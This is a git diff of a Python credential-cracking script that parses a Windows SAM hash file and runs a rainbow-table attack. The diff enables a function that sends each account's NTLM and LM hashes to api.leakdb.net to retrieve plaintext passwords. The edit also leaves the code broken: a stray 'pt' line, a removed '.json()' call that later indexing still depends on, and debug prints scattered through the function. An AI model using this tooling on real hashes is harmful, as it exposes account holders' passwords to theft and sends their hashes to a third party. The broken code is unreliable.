@@ -66,15 +66,9 @@ def read_and_parse_sam_file_lines(sam_filename):
 def get_url(a_queue, a_url):
     # Pre: a_url is a legitimate URL
     # Post: Content of a_url is at the back #######################
-    try:
-        # ?j for JSON
-        a_queue.put(requests.get(a_url).json())
-    except Exception:
-        print(
-            "ERROR: Request to api.leakdb.net has failed. Please check network connection.")
-    return
+    a_queue.put(requests.get(a_url))
 
-'''def online_hash_lookup_by_leakedb_api(accounts_list):
+def online_hash_lookup_by_leakedb_api(accounts_list):
     # Intent: check http://api.leakdb.net for each hash stored in accounts_list
     # Precondition: accounts_list has each key as a username and the value
     #               associated with the key is a list of hashed passwords
@@ -91,14 +85,20 @@ def get_url(a_queue, a_url):
         ntlm_urls.append('https://api.leakdb.net/?j=%s' % each_user.ntlm)
         lm_urls.append('https://api.leakdb.net/?j=%s' % each_user.lm)
 
+    print(ntlm_urls)  #######################################################################################
+    print(lm_urls)  #######################################################################################
+
     for url in ntlm_urls:
         thread = Thread(target=get_url, args=(ntlm_queue, url))
         thread.start()
 
+    print(ntlm_queue.get())  #######################################################################################
+    print(lm_queue.get())  #######################################################################################
+
     for url in lm_urls:
         thread = Thread(target=get_url, args=(lm_queue, url))
         thread.start()
-
+    pt
     for this_user in accounts_list:
         if(ntlm_queue.not_empty):
             json = ntlm_queue.get()
@@ -110,7 +110,7 @@ def get_url(a_queue, a_url):
                 this_user.cracked(json['hashes'][0]['plaintext'])
         this_user.write_output()  # echo results
     return
-'''
+
 def ntlm_rainbow_table_attack(dictionary,accounts_list):
     DictionaryAttack.precompute_rainbow_table_db(dictionary)
     for each_user in accounts_list:
@@ -187,9 +187,10 @@ def draw_gui():
     root.mainloop()
 
 def main():
-    ## draw_gui() #################  S K I P    G U I  ##########################################
+    ## draw_gui() #################  S K I P    G U I  ########################################################################################################
     read_in_accounts = read_and_parse_sam_file_lines(SAM_TARGET_FILE)
-    ntlm_rainbow_table_attack(PASSWORD_DICTIONARY,read_in_accounts)
+    online_hash_lookup_by_leakedb_api(read_in_accounts)
+    ###########################################################ntlm_rainbow_table_attack(PASSWORD_DICTIONARY,read_in_accounts)
     return
 
 if __name__ == "__main__":  # stops main execution if imported as module
